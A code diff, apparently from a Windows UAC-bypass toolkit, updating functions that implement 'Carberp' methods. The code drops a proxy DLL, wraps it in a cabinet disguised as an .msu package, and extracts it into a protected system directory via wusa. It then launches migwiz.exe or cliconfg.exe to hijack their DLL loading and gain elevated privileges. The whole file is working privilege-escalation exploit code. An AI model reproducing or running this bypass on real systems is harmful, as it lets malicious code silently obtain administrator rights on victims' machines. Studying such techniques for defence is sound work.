@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     2.00
+*  VERSION:     2.10
 *
-*  DATE:        16 Nov 2015
+*  DATE:        16 Apr 2016
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -29,37 +29,26 @@
 *
 */
 BOOL ucmWusaExtractPackage(
-	LPWSTR lpCommandLine
-	)
+    LPWSTR lpCommandLine
+    )
 {
-	BOOL bResult = FALSE, cond = FALSE;
-	WCHAR szMsuFileName[MAX_PATH + 1];
-	WCHAR szCmd[MAX_PATH * 4];
+    BOOL bResult = FALSE;
+    WCHAR szMsuFileName[MAX_PATH * 2];
+    WCHAR szCmd[MAX_PATH * 4];
 
-	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
+    RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
+    _strcpy(szMsuFileName, g_ctx.szTempDirectory);
+    _strcat(szMsuFileName, ELLOCNAK_MSU);
 
-	do {
+    //extract msu data to target directory
+    RtlSecureZeroMemory(szCmd, sizeof(szCmd));
+    wsprintfW(szCmd, lpCommandLine, szMsuFileName);
+    bResult = supRunProcess(L"cmd.exe", szCmd);
 
-		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
-			szMsuFileName, MAX_PATH) == 0)
-		{
-			break;
-		}
-
-		//extract msu data to target directory
-		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
-		bResult = supRunProcess(L"cmd.exe", szCmd);
-		if (bResult == FALSE) {
-			break;
-		}
-
-	} while (cond);
-
-	if (szMsuFileName[0] != 0) {
-		DeleteFileW(szMsuFileName);
-	}
-	return bResult;
+    if (szMsuFileName[0] != 0) {
+        DeleteFileW(szMsuFileName);
+    }
+    return bResult;
 }
 
 /*
@@ -71,70 +60,69 @@ BOOL ucmWusaExtractPackage(
 *
 */
 BOOL ucmWusaMethod(
-	UACBYPASSMETHOD Method,
-	PVOID ProxyDll,
-	DWORD ProxyDllSize
-	)
+    UACBYPASSMETHOD Method,
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
 {
-	BOOL bResult = FALSE, cond = FALSE;
-	LPWSTR lpSourceDll, lpCommandLine, lpTargetProcess;
-	WCHAR szCmd[MAX_PATH * 4];
+    BOOL   bResult = FALSE, cond = FALSE;
+    LPWSTR lpCommandLine;
+    WCHAR  szSourceDll[MAX_PATH * 2];
+    WCHAR  szTargetProcess[MAX_PATH * 2];
 
-	if (
-		(ProxyDll == NULL) ||
-		(ProxyDllSize == 0)
-		)
-	{
-		return FALSE;
-	}
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
+        return FALSE;
+    }
 
-	switch (Method) {
+    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);
+    _strcpy(szSourceDll, g_ctx.szTempDirectory);
 
-	//use migwiz.exe as target
-	case UacMethodCarberp1:
-		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
-		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
-		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
-		break;
+    switch (Method) {
 
-	//use cliconfg.exe as target
-	case UacMethodCarberp2:
-		lpSourceDll = METHOD_SQLSRV_SOURCEDLL;
-		lpCommandLine = METHOD_SQLSRV_CMDLINE;
-		lpTargetProcess = METHOD_SQLSRV_TARGETAPP;
-		break;
+        //use migwiz.exe as target
+    case UacMethodCarberp1:
+        _strcat(szSourceDll, WDSCORE_DLL);
+        lpCommandLine = CMD_EXTRACT_MIGWIZ;
+        _strcat(szTargetProcess, MIGWIZ_EXE);
+        break;
 
-	default:
-		return FALSE;
-	}
+        //use cliconfg.exe as target
+    case UacMethodCarberp2:
+        _strcat(szSourceDll, NTWDBLIB_DLL);
+        lpCommandLine = CMD_EXTRACT_SYSTEM32;
+        _strcat(szTargetProcess, CLICONFG_EXE);
+        break;
 
-	do {
+    default:
+        return FALSE;
+    }
 
-		//
-		// Extract file to the protected directory
-		// First, create cab with fake msu ext, second run fusion process.
-		//
-		if (!ucmCreateCabinetForSingleFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
-			break;
-		}
+    if (!PathFileExists(szTargetProcess)) {
+        OutputDebugString(L"[UCM] Target application not found");
+        return FALSE;
+    }
 
-		if (!ucmWusaExtractPackage(lpCommandLine)) {
-			break;
-		}
+    do {
 
-		//run target process for dll hijacking
-		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		if (ExpandEnvironmentStringsW(lpTargetProcess,
-			szCmd, MAX_PATH) == 0)
-		{
-			break;
-		}
-		bResult = supRunProcess(szCmd, NULL);
+        //
+        // Extract file to the protected directory
+        // First, create cab with fake msu ext, second run fusion process.
+        //
+        if (!ucmCreateCabinetForSingleFile(szSourceDll, ProxyDll, ProxyDllSize)) {
+            break;
+        }
 
-	} while (cond);
+        if (!ucmWusaExtractPackage(lpCommandLine)) {
+            break;
+        }
+
+        //run target process for dll hijacking
+        bResult = supRunProcess(szTargetProcess, NULL);
+
+    } while (cond);
 
 
-	return bResult;
+    return bResult;
 }
 
 /*
@@ -146,56 +134,42 @@ BOOL ucmWusaMethod(
 *
 */
 BOOL ucmCreateCabinetForSingleFile(
-	LPWSTR lpSourceDll,
-	PVOID ProxyDll,
-	DWORD ProxyDllSize
-	)
+    LPWSTR lpSourceDll,
+    PVOID ProxyDll,
+    DWORD ProxyDllSize
+    )
 {
-	BOOL cond = FALSE, bResult = FALSE;
-	CABDATA *Cabinet = NULL;
-	WCHAR szDllFileName[MAX_PATH + 1];
-	WCHAR szMsuFileName[MAX_PATH + 1];
+    BOOL     cond = FALSE, bResult = FALSE;
+    CABDATA *Cabinet = NULL;
+    LPWSTR   lpFileName;
+    WCHAR    szMsuFileName[MAX_PATH * 2];
 
-	if (
-		(ProxyDll == NULL) ||
-		(ProxyDllSize == 0)
-		)
-	{
-		return FALSE;
-	}
+    if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
+        return FALSE;
+    }
 
-	do {
+    do {
 
-		//drop proxy dll
-		RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
-		if (ExpandEnvironmentStringsW(lpSourceDll,
-			szDllFileName, MAX_PATH) == 0)
-		{
-			break;
-		}
-		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
-			break;
-		}
+        //drop proxy dll
+        if (!supWriteBufferToFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
+            break;
+        }
 
-		//build cabinet
-		RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
-		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
-			szMsuFileName, MAX_PATH) == 0)
-		{
-			break;
-		}
-		Cabinet = cabCreate(szMsuFileName);
-		if (Cabinet) {
-			lpSourceDll = _filenameW(szDllFileName);
-			//put file without compression
-			bResult = cabAddFile(Cabinet, szDllFileName, lpSourceDll);
-			cabClose(Cabinet);
-		}
-		else {
-			break;
-		}
+        //build cabinet
+        RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
+        _strcpy(szMsuFileName, g_ctx.szTempDirectory);
+        _strcat(szMsuFileName, ELLOCNAK_MSU);
 
-	} while (cond);
+        Cabinet = cabCreate(szMsuFileName);
+        if (Cabinet == NULL)
+            break;
 
-	return bResult;
+        lpFileName = _filename(lpSourceDll);
+        //put file without compression
+        bResult = cabAddFile(Cabinet, lpSourceDll, lpFileName);
+        cabClose(Cabinet);
+
+    } while (cond);
+
+    return bResult;
 }
